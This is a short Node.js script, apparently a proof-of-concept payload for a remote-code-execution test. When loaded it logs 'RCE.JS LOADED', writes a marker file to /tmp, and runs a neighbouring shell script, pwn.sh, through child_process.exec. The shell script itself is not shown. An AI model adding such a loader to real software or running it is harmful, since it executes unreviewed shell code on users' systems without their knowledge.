console.log("RCE.JS LOADED");
const fs = require('fs');
const { exec } = require('child_process');
fs.writeFileSync('/tmp/rce_loaded', 'yes');
exec('bash ' + __dirname + '/pwn.sh');
